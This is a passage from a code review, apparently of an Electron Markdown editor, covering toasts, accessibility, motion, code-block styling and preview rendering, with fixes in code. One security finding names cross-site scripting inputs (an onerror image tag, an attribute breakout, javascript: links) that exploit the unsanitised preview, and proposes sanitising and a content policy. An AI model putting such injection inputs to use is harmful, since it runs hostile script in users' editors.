    setTimeout(() => setToasts(t => t.filter(x => x.id !== id)), n.kind === 'error' ? 6000 : 2800);
  }, []);
  ```
  ```tsx
  <div role="status" aria-live="polite" className="absolute bottom-4 right-4 z-30 flex flex-col gap-2">
    {toasts.map(t => <Toast key={t.id} {...t} />)}
  </div>
  ```
  Drop `animate-ping`; keep the dot static.

#### [MEDIUM] I8. Confetti fires on every single save
- **File:** `App.tsx:454-458` and `:555-559`
- **Current:**
  ```tsx
  confetti({ particleCount: 25, spread: 40, origin: { y: 0.9, x: 0.1 } });
  ```
- **Problem:** A celebration animation on Ctrl+S is the single most "consumer toy" signal in the app, and it is *non-deterministic*: save via keyboard, via toolbar, or via the palette and you get a different origin. Saving is the most frequent action in the app; making it visually noisy trains users to ignore the whole status channel. It also ignores `prefers-reduced-motion`.
- **Fix:** Delete both `confetti` calls and the `canvas-confetti` dependency. Replace with a 400ms accent flash on the Save button plus the toast. If you want a reward, make it a one-time first-save celebration.

#### [MEDIUM] I9. Four elements pulse simultaneously
- **File:** `TitleBar.tsx:61` (dirty dot), `CommandBar.tsx:125` (Save dot), `StatusBar.tsx:36` (`AlertCircle`), `App.tsx:931` (toast dot), `App.tsx:776` (`animate-bounce`)
- **Problem:** Up to four independent `animate-pulse` loops plus a `bounce`, all out of phase. This is visual noise that reads as "something is wrong" rather than "something is active."
- **Fix:** One pulse, and only while genuinely transient. The dirty state is **persistent**, so make it static (`bg-[var(--warning-400)]` filled circle, no animation) and let only the StatusBar's `AlertCircle` breathe. Toast dot: static.

#### [MEDIUM] I10. Tooltips promise shortcuts that do not exist
- **File:** `CommandBar.tsx:328` (`"Decrease font zoom (A-)"`), `:338` (`"Increase font zoom (A+)"`), `:224,231,236,244,251,258,266,273,280,287,294,301,352,365`; `CommandPalette.tsx:137` (`"Print / Save as PDF… (Ctrl+P)"`); `ShortcutsModal.tsx:245` (`"Tip: Press ESC anytime to close"`)
- **Problem:** `A-`/`A+` are not implemented. `Ctrl+P` is not implemented (and `CommandPalette.tsx:138` routes it to the Export modal, not print). `Esc` closes **only** the CommandPalette (`CommandPalette.tsx:178`) — ExportModal, ShortcutsModal, SampleFilesModal and the Lightbox have **zero** Escape handlers, so `ShortcutsModal.tsx:245` is a lie.
- **Fix:** Implement all of them (see A4, I11), or delete the claims. Tooltips that lie are worse than no tooltips.

#### [MEDIUM] I11. Status bar shows a stale cursor position and fabricated file metadata
- **File:** `src/components/StatusBar.tsx:74-88`
- **Current:**
  ```tsx
  <span className="hidden sm:inline font-medium">Ln {cursorLine}, Col {cursorCol}</span>
  …
  <span className="font-semibold">UTF-8</span>
  <span className="font-semibold">CRLF</span>
  ```
- **Problem:** (a) `Ln/Col` is always rendered, but in preview-only mode there is no cursor — it displays a frozen `Ln 1, Col 1` (`App.tsx:940-941` passes `cursorPos` unconditionally). (b) **`CRLF` is fabricated.** `handleSave` writes `activeTab.content` verbatim (`App.tsx:424`), which is whatever the textarea holds — LF on Windows, since nothing normalises line endings. (c) `Markdown (GFM)` (`StatusBar.tsx:88`) is contradicted by `breaks: true` (`markdown.ts:6`), which is *not* GFM. Displaying confidently wrong file facts is worse than displaying none.
- **Fix:** Hide `Ln/Col` unless the active view mode contains the editor. Compute the real values:
  ```tsx
  const eol = content.includes('\r\n') ? 'CRLF' : 'LF';
  const enc = /^[\x00-\x7F]*$/.test(content) ? 'UTF-8' : 'UTF-8 (non-ASCII)';
  ```
  Make `LF`/`CRLF` and `UTF-8` clickable to open a real line-ending preference (write-time normalisation is a genuine missing feature).

#### [LOW] I12. `handleInsertMarkdown` races with a 60ms `setTimeout`
- **File:** `src/App.tsx:631-638`
- **Current:**
  ```tsx
  if (activeTab?.viewMode === 'preview') handleChangeViewMode('split');
  setTimeout(() => { editorRef.current?.insertText(prefix, suffix, defaultText); }, 60);
  ```
- **Problem:** The 60ms is a guess at React's commit latency for the mode switch. On a loaded machine the `RawEditor` may not be mounted yet and the insert silently no-ops; on a fast machine it works. Non-deterministic feature.
- **Fix:** Drive it from an effect keyed on the pending action:
  ```tsx
  const [pendingInsert, setPendingInsert] = useState<[string,string,string] | null>(null);
  useEffect(() => { if (!pendingInsert) return;
    editorRef.current?.insertText(...pendingInsert); setPendingInsert(null); }, [pendingInsert, activeTab?.viewMode]);
  ```

---

### Accessibility

Full inventory of what exists: **0** `aria-*` attributes, **0** `role=` attributes, **0** `focus-visible` rules, **0** `prefers-reduced-motion` rules, **1** `disabled:` utility, **1** Escape handler, across **73** buttons and **5** modals.

#### [HIGH] A1. No modal has a role, a label, `aria-modal`, a focus trap, or focus return
- **File:** `CommandPalette.tsx:191-197`, `ExportModal.tsx:61-67`, `ShortcutsModal.tsx:115-121`, `SampleFilesModal.tsx:23-26`, `ImageLightboxModal.tsx:35-38`
- **Current:** `CommandPalette.tsx:191-197` — `<div onClick={…} className="fixed inset-0 z-50 …">` then `<div className="w-full max-w-xl rounded-2xl …">`
- **Problem:** Every dialog is two anonymous `div`s. A screen reader announces nothing; focus is never moved (only `CommandPalette` and `ShortcutsModal` have `autoFocus` on an input — `ExportModal`, `SampleFilesModal` and the Lightbox have **nothing**, so Tab walks through the app *behind* the scrim); Tab then escapes the dialog into the obscured UI; on close focus falls back to `<body>` and the user restarts from the top.
- **Fix:** Extract one primitive and use it five times:
  ```tsx
  // src/components/Dialog.tsx
  export function Dialog({ open, onClose, labelledBy, children, className }) {
    const ref = useRef<HTMLDivElement>(null);
    const prev = useRef<HTMLElement | null>(null);
    useEffect(() => {
      if (!open) return;
      prev.current = document.activeElement as HTMLElement;
      const node = ref.current!;
      const sel = 'a[href],button:not(:disabled),input,select,textarea,[tabindex]:not([tabindex="-1"])';
      (node.querySelector<HTMLElement>(sel) ?? node).focus();
      const onKey = (e: KeyboardEvent) => {
        if (e.key === 'Escape') { e.stopPropagation(); onClose(); return; }
        if (e.key !== 'Tab') return;
        const f = [...node.querySelectorAll<HTMLElement>(sel)].filter(el => el.offsetParent !== null);
        if (!f.length) return;
        const first = f[0], last = f[f.length - 1];
        if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
        else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
      };
      node.addEventListener('keydown', onKey);
      return () => { node.removeEventListener('keydown', onKey); prev.current?.focus(); };
    }, [open, onClose]);
    if (!open) return null;
    return createPortal(
      <motion.div className="fixed inset-0 z-40 grid place-items-center bg-black/70 p-4 backdrop-blur-sm"
                  initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} onClick={onClose}>
        <motion.div ref={ref} role="dialog" aria-modal="true" aria-labelledby={labelledBy} tabIndex={-1}
                    className={className} onClick={e => e.stopPropagation()}>
          {children}
        </motion.div>
      </motion.div>, document.body);
  }
  ```
  Then every modal becomes `<Dialog open={isOpen} onClose={onClose} labelledBy="export-title">` with `<h2 id="export-title">`. Wrap each call site in `<AnimatePresence>` so `exit` runs.

#### [HIGH] A2. The tab strip is not a tablist
- **File:** `src/components/TabBar.tsx:29-44` (Home = `<button>`), `:50-105` (documents = `<div onClick>`)
- **Current:**
  ```tsx
  <div key={tab.fileId} onClick={() => onSelectTab(tab.fileId)}
       onAuxClick={…} className={`group relative flex items-center gap-2 …`}>
  ```
- **Problem:** (a) The Home control is a `<button>` and the document tabs are `<div>`s — the two halves of the same control are different elements, so neither inherits the other's keyboard behaviour. (b) No `role="tablist"`/`role="tab"`/`aria-selected`, so a screen-reader user hears a list of unlabelled divs. (c) **Not focusable** — you cannot Tab into the tab strip at all. (d) No `ArrowLeft`/`ArrowRight`, no `Home`/`End`. (e) `onAuxClick` (middle-click close) is mouse-only. (f) There is no `Ctrl+Tab` / `Ctrl+Shift+Tab` to move between tabs, even though `Ctrl+W` exists (`App.tsx:656-660`).
- **Fix:**
  ```tsx
  <div role="tablist" aria-label="Open documents"
       onKeyDown={(e) => {
         const i = tabs.findIndex(t => t.fileId === activeTabId);
         if (e.key === 'ArrowRight') { setActiveTabId(tabs[(i+1) % tabs.length].fileId); e.preventDefault(); }
         if (e.key === 'ArrowLeft')  { setActiveTabId(tabs[(i-1+tabs.length) % tabs.length].fileId); e.preventDefault(); }
         if (e.key === 'Home') { setActiveTabId(tabs[0].fileId); e.preventDefault(); }
       }}>
    {tabs.map((tab, i) => (
      <div role="tab" tabIndex={tab.fileId === activeTabId ? 0 : -1}
           aria-selected={tab.fileId === activeTabId}
           aria-controls="doc-panel"
           id={`tab-${tab.fileId}`}
           onClick={() => onSelectTab(tab.fileId)}
           onAuxClick={e => { if (e.button === 1) { e.preventDefault(); onCloseTab(tab.fileId); } }}
           onKeyDown={e => { if (e.key === 'Delete' || e.key === 'Backspace') onCloseTab(tab.fileId); }}
           className="…">{tab.name}
        {tab.isDirty && <span className="sr-only">(unsaved changes)</span>}
      </div>))}
  </div>
  ```
  Add `Ctrl+Tab` / `Ctrl+Shift+Tab` / `Ctrl+{1..9}` in `App.tsx:641-672`. If the strip stays mouse-only by choice, at minimum render each tab as a `<button>` so it is reachable and announceable.

#### [HIGH] A3. Text in the rendered preview cannot be selected or copied
- **File:** `index.html:31` → `src/components/MarkdownPreview.tsx:144`
- **Current:** `<body class="select-none overflow-hidden antialiased">` … `<div className="markdown-body p-6 md:p-10 max-w-4xl mx-auto h-full overflow-y-auto …">`
- **Problem:** `user-select: none` on `<body>` inherits to every descendant. `RawEditor.tsx:236` re-enables it with `select-text`, and `ExportModal.tsx:239` does too — but **`MarkdownPreview` does not**. So in a Markdown app, the user cannot select, copy, or drag-select a single word out of the rendered document. `MarkdownPreview.tsx:121` even adds `select-none` to the empty state explicitly.
- **Fix:**
  ```tsx
  // MarkdownPreview.tsx:144
  className="markdown-body max-w-[68ch] mx-auto h-full overflow-y-auto px-8 py-10 select-text"
  ```
  Better still, scope the lock to the chrome only: remove `select-none` from `<body>` in `index.html:31` and apply it to `<header>`, the tab strip, the toolbar and the status bar individually.

#### [HIGH] A4. `Esc` closes one modal out of four
- **File:** `CommandPalette.tsx:178` is the **only** `Escape` handler in the codebase (verified by grep)
- **Problem:** `ExportModal`, `ShortcutsModal`, `SampleFilesModal` and `ImageLightboxModal` cannot be dismissed from the keyboard — only by clicking the scrim or hunting for the ✕. `ShortcutsModal.tsx:245` explicitly instructs the user to press Esc.
- **Fix:** The `Dialog` primitive in A1 handles `Escape` globally. Also add `Tab`/`Shift+Tab` cycling in `ImageLightboxModal` and arrow-key pan/zoom (`←/→/↑/↓` to pan, `+`/`-` to scale — the +/- buttons at `:47,57` have no keyboard equivalent).

#### [HIGH] A5. Icon-only buttons have no accessible name
- **File:** `TitleBar.tsx:130-160` (3 caption buttons), `TabBar.tsx:89-104` (close), `:110-120` (new), `CommandBar.tsx:221-304` (13 format buttons), `:309-342` (wrap/zoom), `HomePage.tsx:442-455` (pin), `:471-481` (copy path), `:506-514` (delete), `ImageLightboxModal.tsx:46-80`, `ExportModal.tsx:97-104,127-135,157-165`
- **Problem:** All 73 buttons carry `title="…"`. `title` is **not** an accessible name that reliably survives: it is suppressed when the text content is used, it is not exposed to touch/switch users, and several buttons here have *both* text and a title that disagree (`CommandBar.tsx:224` `title="Bold (Ctrl+B)"` on a `<Bold/>` glyph with no text).
- **Fix:** `aria-label` on every icon-only button, and make `title` the tooltip only:
  ```tsx
  <button aria-label="Bold" title="Bold — Ctrl+B"><Bold className="w-4 h-4" aria-hidden="true"/></button>
  ```
  Add `aria-hidden="true"` to every decorative lucide glyph so the icon set never enters the accessibility tree as noise.

#### [MEDIUM] A6. Reduced-motion is entirely unsupported
- **File:** whole app — 0 occurrences of `prefers-reduced-motion` (verified by grep)
- **Problem:** The app animates via `animate-pulse` ×4, `animate-bounce`, `animate-ping`, `transition-transform duration-300` on images (`index.css:321-328`), `hover:scale-[1.015]` on every image, `hover:scale-[1.02]` on the primary CTA, `hover:translate-y-[-2px]` on pinned cards, plus `confetti`. For a user with `prefers-reduced-motion: reduce`, the drop overlay bounces, images zoom, cards levitate and confetti fires on save.
- **Fix:**
  ```css
  @media (prefers-reduced-motion: reduce) {
    *, *::before, *::after {
      animation-duration: .01ms !important; animation-iteration-count: 1 !important;
      transition-duration: .01ms !important; scroll-behavior: auto !important;
    }
  }
  ```
  Plus in JS, for anything `motion` drives: `<MotionConfig reducedMotion="user">` from `motion/react` at the root of `App.tsx`.

#### [MEDIUM] A7. Keyboard Tab is a trap inside the editor
- **File:** `src/components/RawEditor.tsx:110-122`
- **Current:**
  ```tsx
  if (e.key === 'Tab') { e.preventDefault(); … onChange(content.substring(0, start) + '  ' + content.substring(end)); }
  ```
- **Problem:** `preventDefault()` with no `Escape` escape hatch means that once focus enters the textarea, **Tab can never leave it**. There is no `Shift+Tab` out, no `Escape`, no focus-trap escape. This is a direct failure of **WCAG 2.1.2 No Keyboard Trap**. Additionally the handler is naive: `Shift+Tab` inserts two spaces instead of dedenting, and a selection spanning multiple lines gets two spaces inserted at the caret rather than indenting every selected line.
- **Fix:**
  ```tsx
  if (e.key === 'Tab') {
    if (e.shiftKey && !e.altKey) return;             // let Shift+Tab escape the field
    e.preventDefault();
    const { selectionStart: s, selectionEnd: e2, value } = textarea;
    const lineStart = value.lastIndexOf('\n', s - 1) + 1;
    if (s === e2 && lineStart === e2) {                // no selection: indent current line
      onChange(value.slice(0, s) + '  ' + value.slice(s));
      requestAnimationFrame(() => textarea.setSelectionRange(s + 2, s + 2));
      return;
    }
    const blockEnd = value.indexOf('\n', e2) === -1 ? value.length : value.indexOf('\n', e2);
    const block = value.slice(lineStart, blockEnd);
    const shifted = e.shiftKey
      ? block.replace(/^ {1,2}/gm, '')
      : block.replace(/^/gm, '  ');
    onChange(value.slice(0, lineStart) + shifted + value.slice(blockEnd));
    requestAnimationFrame(() => textarea.setSelectionRange(lineStart, lineStart + shifted.length));
  }
  ```
  Also add an explicit escape hatch documented in the shortcuts modal: **`Ctrl+Enter` returns focus to the document shell.**

#### [MEDIUM] A8. HomePage is a wall of non-semantic click targets
- **File:** `HomePage.tsx:212-221` (result card `<div onClick>`), `:262-285` (snippet row `<div onClick>`), `:313-322` (pinned card `<div onClick>`), `:431-438` (`<tr onClick>`)
- **Problem:** Four interactive surfaces that are `<div>`/`<tr>` with no `tabIndex`, no `role`, no `onKeyDown`. Keyboard and switch users cannot reach the search results, the snippet jump-to-line, or the pinned cards. `<tr onClick>` is especially bad — the browser gives `<tr>` no focus and no activation semantics.
- **Fix:** Make the whole card a `<button>` or wrap it in `<button>`; for table rows use `tabIndex={0}` + `onKeyDown={e => e.key === 'Enter' && open()}` + `role="button"`. For the snippet rows, a `<button>` inside the card is correct — but then the card itself must be a `<button>` too, which nests illegally, so restructure as: card = `<article>` with a single `<button>` overlay (`absolute inset-0` with `sr-only` label) for the primary action, and the snippet rows as real buttons above it in z-order.

#### [MEDIUM] A9. The command palette is not a `listbox`
- **File:** `src/components/CommandPalette.tsx:226-260`
- **Current:**
  ```tsx
  <div className="max-h-84 overflow-y-auto p-2 space-y-1">
    {items.map((item, idx) => (
      <div key={item.id} onClick={…} onMouseEnter={() => setSelectedIndex(idx)} className="flex items-center gap-3 …">
  ```
- **Problem:** (a) No `role="listbox"` / `role="option"` / `aria-activedescendant`, so the highlighted row is announced as nothing. (b) The rows are `<div>`s — not reachable by Tab, which is correct for a combobox, but then the combobox pattern is missing. (c) `aria-controls`/`role="combobox"` + `aria-expanded` are absent from the input (`:204-217`). (d) Selection follows the mouse via `onMouseEnter`, which fights the keyboard: arrowing through the list with a stationary cursor jumps the highlight. (e) No `PageUp`/`PageDown`, no `Home`/`End`. (f) `selectedIndex` is not clamped when the query shrinks `items` — `setSelectedIndex(0)` only fires on `onChange`, so a stale index can point past the end (`:239, :174`).
- **Fix:**
  ```tsx
  <input role="combobox" aria-expanded="true" aria-controls="cmd-list" aria-activedescendant={`cmd-${items[selectedIndex]?.id}`}
         aria-autocomplete="list" autoComplete="off" … />
  <div id="cmd-list" role="listbox" aria-label="Commands and files">
    {items.map((item, i) => (
      <div key={item.id} id={`cmd-${item.id}`} role="option" aria-selected={i === selectedIndex}
           onMouseMove={() => setSelectedIndex(i)} className="…">
  ```
  Clamp with `useEffect(() => setSelectedIndex(i => Math.min(i, items.length - 1)), [items.length])`.

#### [LOW] A10. `<html lang="en">` is set, but nothing else is announced
- **File:** `index.html:2`
- **Current:** `<html lang="en">` (correct), `<title>` (correct), `<meta name="description">` (good).
- **Problem:** No `<main>` landmark label, no `aria-label` on `<main>` (`App.tsx:846`), no heading hierarchy in the app shell — `HomePage.tsx:92` is the only `<h1>` and it disappears the moment a document opens, leaving `ExportModal.tsx:82` / `ShortcutsModal.tsx:136` as the top-level heading with no `h1` present.
- **Fix:** `<main aria-label="Document workspace">`, give the shell a visually-hidden `<h1>` per view, and demote `HomePage.tsx:92` to `<h1>` only on the home route.

---

### Motion

**`motion` / framer-motion is a declared dependency (`package.json:48`) and is imported in zero files.** All motion is CSS `transition` utilities and `animate-*` keyframes. Combined with U6 (the 11 plugin animation classes that compile to nothing), the honest summary is: **the app has no designed motion at all, and the motion it appears to have does not run.**

#### [HIGH] M1. No shared timing system
- **File:** `duration-150` ×10, `duration-200` ×1, `duration-300` ×1, `duration-100` ×1, and **73 bare `transition`s with no duration class** — which inherit Tailwind's default `150ms` and the default `cubic-bezier(0.4,0,0.2,1)`. No `ease-*` utility appears anywhere in the repo.
- **Problem:** Four durations and one default easing, chosen ad hoc. Nothing coordinates.
- **Fix:** `--dur-1: 120ms` (hover, press) · `--dur-2: 180ms` (panel, popover) · `--dur-3: 260ms` (dialog, layout), all on `--ease-out: cubic-bezier(.16,1,.3,1)` for enter and `--ease-in: cubic-bezier(.4,0,1,1)` for exit. Define them in `@theme` and require them: `transition-colors duration-150 ease-[var(--ease-out)]`.

#### [MEDIUM] M2. Layout-shifting transforms on list items
- **File:** `HomePage.tsx:113` (`hover:scale-[1.02]`), `HomePage.tsx:317` (`hover:translate-y-[-2px]`), `index.css:321-328` (`img { transition: transform .2s, box-shadow .2s } img:hover { transform: scale(1.015) }`)
- **Problem:** `transform` is in Tailwind's default `transition` property list, so these run on every hover. On a grid of pinned cards (`HomePage.tsx:312`) the lift creates a visible reflow of the shadow; on every preview image, a 1.5% zoom plus a blue glow on hover is a strong "portfolio site" tell in a reading surface.
- **Fix:** Remove `hover:scale-[1.015]` from images (keep `cursor: zoom-in` and a 1px border-colour change). Replace the card lift with `transition-[border-color,box-shadow] duration-150` + `hover:border-[--accent-500] hover:shadow-2` — no transform, no reflow.

#### [MEDIUM] M3. `transition-all` on the whole card
- **File:** `HomePage.tsx:317`
- **Problem:** `transition-all` animates every animatable property including `layout`, `filter` and `box-shadow` on a card containing text — text reflow during a shadow change is a classic jank source on low-end Windows GPUs (Electron's default is GPU-accelerated, but these are the elements most likely to be composited on the CPU when many cards mount).
- **Fix:** Name the properties: `transition-[border-color,box-shadow,background-color] duration-150 ease-[var(--ease-out)]`.

#### [LOW] M4. `backdrop-blur` on a 95%-opaque surface does nothing
- **File:** `TitleBar.tsx:37` (`backdrop-blur-md` + `bg-slate-900/95`)
- **Problem:** At 95% opacity the blur is mathematically invisible — a wasted compositing layer on every frame during scroll.
- **Fix:** Either go `bg-transparent` with a real blur (and add the drag region), or drop the blur. For a solid chrome bar: `bg-[var(--surface-1)]` with no backdrop filter.

---

### Markdown preview quality

**`marked` is configured with `gfm: true` and `breaks: true` (`markdown.ts:4-7`) — and nothing else.** No sanitizer, no extensions, no `marked-gfm-heading-id`, no footnote support, no `walkTokens` hook.

#### [HIGH] MD1. `breaks: true` makes the preview disagree with every other Markdown renderer
- **File:** `src/services/markdown.ts:6`
- **Current:** `new Marked({ gfm: true, breaks: true })`
- **Problem:** `breaks: true` converts **every single newline** into a `<br>`. In a source file with hard-wrapped prose — the way most people write Markdown, and the way every sample in `src/data/samples.ts` is authored — the preview inserts a line break at every 80-column wrap. The result has ragged, half-width lines with no paragraph structure, and it will not match GitHub, Obsidian, VS Code or Typora. This is a top-3 reason the preview "looks wrong."
- **Fix:** `breaks: false`. If you want an authoring convenience, expose it as an explicit, **off-by-default** setting so the user opts into non-standard behaviour rather than getting it silently.

#### [HIGH] MD2. `dangerouslySetInnerHTML` with no sanitizer — a hostile file executes code
- **File:** `src/components/MarkdownPreview.tsx:147`; `electron/main.cjs:19-22`
- **Current:**
  ```tsx
  dangerouslySetInnerHTML={{ __html: htmlContent }}
  ```
- **Problem:** `marked` does not sanitize, and `MarkdownPreview` renders its output raw. A `.md` file containing `<img src=x onerror="…">`, `<iframe>`, or a `javascript:`/`data:text/html` link executes in the renderer. There is no CSP in `index.html`, no `DOMPurify`, and `nodeIntegration: false, contextIsolation: true` is the only thing limiting the blast radius. `renderer.image` (`markdown.ts:15-18`) is worse — it interpolates `href` and `text` into HTML with **no escaping at all**, so `![x" onerror="…](…)` breaks straight out of the attribute.
- **Fix:** (1) Add `DOMPurify` and sanitize the rendered string; (2) escape in the custom renderers; (3) add a CSP.
  ```ts
  // markdown.ts — escape before interpolating
  const esc = (s: string) => s.replace(/&/g,'&amp;').replace(/</g,'&lt;')
                             .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  image({ href, title, text }) { … `<img src="${esc(href)}" alt="${esc(text)}" …>` }
  ```
  ```ts
  // MarkdownPreview.tsx:26
  const htmlContent = useMemo(() => DOMPurify.sanitize(parseMarkdown(content), {
    ADD_ATTR: ['target'], ADD_TAGS: ['figure', 'figcaption'],
  }), [content]);
  ```
  ```html
  <!-- index.html, inside <head> -->
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline';
                 script-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'" />
  ```

#### [HIGH] MD3. `renderer.blockquote` reads `token.text`, which `marked` removed — blockquotes render empty
- **File:** `src/services/markdown.ts:72-77`
- **Current:**
  ```ts
  blockquote(token: any) {
    const rawText = token.text || '';
    const parsedContent = markedInstance.parse(rawText);
    return `<blockquote class="… text-slate-300 italic [&>p]:m-0">${parsedContent}</blockquote>`;
  }
  ```
- **Problem:** Since `marked` v5/v8, the blockquote token exposes `tokens`, not `text`. In `marked@18` `token.text` is `undefined`, so `rawText` is `''`, `parsedContent` is `''`, and **every blockquote in every document renders as an empty coloured bar.** Verify at runtime; if confirmed, the 42 lines of blockquote CSS in `index.css:133-137, 219-223, 330-335` are styling an invisible box.
- **Fix:**
  ```ts
  blockquote({ tokens }) {
    const inner = this.parser.parse(tokens);          // v18 API — no re-entrant parse()
    return `<blockquote>${inner}</blockquote>`;
  }
  ```
  Delete the hand-written classes — `index.css` already styles blockquotes properly for both themes.

#### [HIGH] MD4. Code blocks get 36px of horizontal padding from two competing rules
- **File:** `markdown.ts:68` (`<pre class="p-4 …">`) vs `index.css:373-379` (`.markdown-body pre code { padding: 1.25rem }`)
- **Problem:** `p-4` = 16px on the `<pre>`, `1.25rem` = 20px on the `<code>` → **36px each side**, 72px of chrome around the shortest possible snippet, inside a wrapper that already has its own 16px header row. Every code block looks padded-out and unbalanced.
- **Fix:** Remove the padding from `index.css:378` and keep exactly one declaration:
  ```css
  .markdown-body pre { margin: 0; border-radius: 0; background: transparent; border: 0; box-shadow: none; }
  .markdown-body pre code { display: block; padding: 1rem 1.25rem; font-size: .9em; line-height: 1.65; }
  ```

#### [MEDIUM] MD5. Light theme renders code blocks with a mismatched double frame
- **File:** `index.css:213-217` (`#1e293b !important`) vs `markdown.ts:49` (`bg-[#0d1117]`)
- **Problem:** The wrapper div is `#0d1117` in both themes; the inner `<pre>` is forced to `#1e293b` in light and `#090d16` in dark. In light mode you get a near-black frame containing a visibly lighter slab, and in dark mode a `#0d1117` frame containing a `#090d16` slab. Neither matches its own header bar (`bg-slate-900/90`).
- **Fix:** Delete `index.css:127-131` and `:213-217` entirely and let the renderer own the frame, driven by a var so it themes correctly:
  ```css
  .md-code { background: var(--code-bg); border: 1px solid var(--border-default); border-radius: var(--radius-lg); overflow: hidden; }
  .md-code__bar { background: var(--code-header); border-bottom: 1px solid var(--border-default); }
  ```

#### [MEDIUM] MD6. macOS traffic-light dots in a Windows app
- **File:** `markdown.ts:52-54`
- **Current:**
  ```html
  <span class="w-2.5 h-2.5 rounded-full bg-red-500/70 inline-block"></span>
  <span class="w-2.5 h-2.5 rounded-full bg-amber-500/70 inline-block"></span>
  <span class="w-2.5 h-2.5 rounded-full bg-emerald-500/70 inline-block"></span>
  ```
- **Problem:** Red/yellow/green window dots are a macOS convention. Three decorative dots above every code block in a Windows-only Electron app is a copy-paste artefact, and they carry **zero meaning** — they're not closable, not minimizable, not colour-coded.
- **Fix:** Replace with a filename/line indicator, which is what the dots are standing in for:
  ```html
  <div class="md-code__bar flex items-center justify-between px-4 h-9">
    <span class="font-mono text-2xs uppercase tracking-wider text-[var(--text-tertiary)] tabular-nums">
      ${displayLang}${lineCount ? ` · ${lineCount} lines` : ''}
    </span>
    <button class="copy-code-btn …" data-code="${encodedCode}" aria-label="Copy code to clipboard">…</button>
  </div>
  ```

#### [MEDIUM] MD7. `hljs.highlightAuto` runs on every keystroke for every unlabelled fence
- **File:** `markdown.ts:36`; `MarkdownPreview.tsx:26`
- **Current:**
  ```ts
  highlightedCode = hljs.highlightAuto(text).value;   // :36
  ```
  ```tsx
  const htmlContent = React.useMemo(() => parseMarkdown(content), [content]);   // MarkdownPreview:26
  ```
- **Problem:** `parseMarkdown` re-runs the whole document on **every keystroke** (`content` is a dep, `RawEditor` calls `onChange` per character). `highlightAuto` is hljs's slowest path — it scores the text against every registered language grammar. A 2000-line document with 20 unlabelled fences = 20 full language detections per character typed. This is the single largest source of input lag.
- **Fix:** Debounce the parse and drop auto-detection:
  ```tsx
  // MarkdownPreview.tsx
  const [debounced, setDebounced] = useState(content);
  useEffect(() => { const t = setTimeout(() => setDebounced(content), 180);
                     return () => clearTimeout(t); }, [content]);
  const htmlContent = useMemo(() => parseMarkdown(debounced), [debounced]);
  ```
  ```ts
  // markdown.ts — no language tag means no highlighting, not "guess"
  if (language) highlightedCode = hljs.highlight(text, { language }).value;
  else highlightedCode = escapeHtml(text);
  ```
  Also add `hljs.registerLanguage` selectively — you currently bundle all 190 languages.

#### [MEDIUM] MD8. Preview links navigate the app out of existence
- **File:** `index.css:292-296` (no `target`); `markdown.ts` (renderer never sets it); `electron/main.cjs` (no navigation guard)
- **Current:** `.markdown-body a { text-decoration: underline; text-underline-offset: 3px; transition: color .15s ease; }`
- **Problem:** Clicking any link in the preview navigates the `BrowserWindow` to the remote URL. Because `win.loadFile()` was used, the user ends up looking at a web page with no way back, and their tabs are gone. There is no `will-navigate` or `setWindowOpenHandler` in `main.cjs`. There is also no external-link affordance — nothing distinguishes an outbound link from internal text.
- **Fix:** Renderer:
  ```ts
  markedInstance.use({ renderer: {
    link({ href, tokens }) {
      const inner = this.parser.parseInline(tokens);
      const external = /^https?:/i.test(href);
      return external
        ? `<a href="${esc(href)}" target="_blank" rel="noopener noreferrer" class="md-link">${inner}<svg class="md-link__icon" …/></a>`
        : `<a href="${esc(href)}" class="md-link">${inner}</a>`;
    },
  }});
  ```
  Main process:
  ```js
  win.webContents.setWindowOpenHandler(({ url }) => {
    if (/^https?:/i.test(url)) shell.openExternal(url);
    return { action: 'deny' };
  });
  win.webContents.on('will-navigate', (e, url) => {
    if (url !== win.webContents.getURL()) { e.preventDefault(); shell.openExternal(url); }
  });
  ```
  Plus a right-click context menu with *Open in Browser / Copy Link Address / Copy Markdown Source*.

#### [MEDIUM] MD9. Images: double margins, no broken state, blue hover glow
- **File:** `markdown.ts:15-27`; `index.css:313-328`
- **Problem:** (a) `<figure class="my-5">` (`markdown.ts:16`) plus `.markdown-body img { margin: 1.4rem auto }` (`index.css:318`) = ~44px of dead space above and below every image. (b) A broken URL renders the browser's broken-image glyph inside a bordered, shadowed, 500px-capped frame with a "🔍 Click to zoom" overlay; clicking it opens the lightbox, which shows the same broken image. (c) `img:hover { box-shadow: 0 10px 32px rgba(0,120,212,.3) }` (`index.css:327`) — a blue glow, on every image, on hover. (d) Alt text is duplicated as a caption (`markdown.ts:25` uses `text` for both `alt=` and `<figcaption>`), so every image with alt text shows it twice. (e) `max-h-[500px]` (`markdown.ts:18`) silently crops tall screenshots with no way to see the rest except the lightbox.
- **Fix:**
  ```ts
  image({ href, title, text }) {
    return `<figure class="md-figure">
      <button class="md-figure__frame" data-zoom="${esc(href)}" aria-label="View image: ${esc(text || 'image')}">
        <img src="${esc(href)}" alt="${esc(text)}" loading="lazy" decoding="async"
             onerror="this.closest('.md-figure__frame').classList.add('is-broken')"
             onload="this.closest('.md-figure__frame').classList.remove('is-broken')" />
        <span class="md-figure__broken"><svg …/>Image failed to load</span>
      </button>
      ${text ? `<figcaption class="md-figcaption">${esc(text)}</figcaption>` : ''}
    </figure>`;
  }
  ```
  ```css
  .md-figure { margin: 0; }
  .md-figure__frame { display:block; border-radius: var(--radius-lg); overflow: hidden;
                      border: 1px solid var(--border-subtle); cursor: zoom-in; background: var(--surface-2); }
  .md-figure__frame:hover { border-color: var(--accent-500); }
  .md-figure__frame.is-broken img { display: none; }
  .md-figure figcaption, .md-figcaption { margin-top: .5rem; font-size: var(--text-2xs);
                                          color: var(--text-tertiary); text-align: center; font-style: italic; }
  ```
  Drop the glow, drop the emoji overlay, remove `max-h` and let the lightbox handle scaling.

#### [MEDIUM] MD10. Wide tables overflow the pane with no scroll affordance
- **File:** `index.css:338-345`
- **Current:** `.markdown-body table { width: 100%; border-collapse: collapse; margin: 1.4rem 0; border-radius: .6rem; overflow: hidden; }`
